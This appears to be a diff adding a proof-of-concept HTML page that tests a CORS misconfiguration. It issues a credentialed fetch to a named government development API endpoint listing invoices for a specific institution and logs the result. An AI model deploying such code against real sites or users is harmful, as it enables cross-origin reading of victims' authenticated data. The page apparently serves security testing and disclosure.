@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS Test</title>
+</head>
+<body>
+  <h1>CORS Misconfiguration Test</h1>
+
+  <script>
+    fetch('https://dev.pdpc.go.tz/front/v1/list_invoices/?page_size=1&page=1&institution_id=T6LBBK7gj86LGFVq&format=json', {
+      method: 'GET',
+      credentials: 'include'
+    })
+    .then(response => response.json())
+    .then(data => console.log(data))
+    .catch(error => console.error('Error:', error));
+  </script>
+
+</body>
+</html>
